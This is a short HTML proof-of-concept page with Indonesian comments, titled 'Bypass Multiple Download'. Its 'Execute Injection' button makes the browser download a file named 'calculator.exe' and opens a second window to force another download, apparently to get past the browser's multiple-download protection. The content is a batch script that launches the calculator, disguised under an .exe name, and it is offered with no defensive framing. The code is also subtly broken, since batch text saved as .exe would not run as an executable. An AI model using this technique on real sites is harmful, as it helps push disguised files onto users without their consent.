<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Bypass Multiple Download</title>
    <style>
        body { font-family: system-ui, sans-serif; max-width: 400px; margin: 40px auto; text-align: center; }
        button { width: 100%; padding: 12px; background: #0056b3; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <h2>Bypass Multiple Download</h2>
    <button onclick="run()">Execute Injection</button>
    <script>
        function download(name, content) {
            const a = document.createElement('a');
            // ↓↓↓ DIUBAH: tipe menjadi application/octet-stream agar disimpan sebagai .exe ↓↓↓
            a.href = URL.createObjectURL(new Blob([content], { type: 'application/octet-stream' }));
            a.download = name;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }
        function run() {
            // ↓↓↓ DIUBAH: nama file jadi calculator.exe, konten jadi batch script ↓↓↓
            download('calculator.exe', '@echo off\nstart calc.exe');
            setTimeout(() => {
                const win = window.open('', '_blank');
                if (win) {
                    // ↓↓↓ DIUBAH: Ganti win.document.write + setTimeout dengan navigasi langsung ke blob URL ↓↓↓
                    // Caranya lebih andal untuk memicu unduhan di browser modern
                    win.location = URL.createObjectURL(new Blob(['@echo off\nstart calc.exe'], { type: 'application/octet-stream' }));
                    // catatan: win.document.write dan close() dihilangkan karena tidak diperlukan untuk trigger unduhan
                }
            }, 500);
        }
    </script>
</body>
</html>
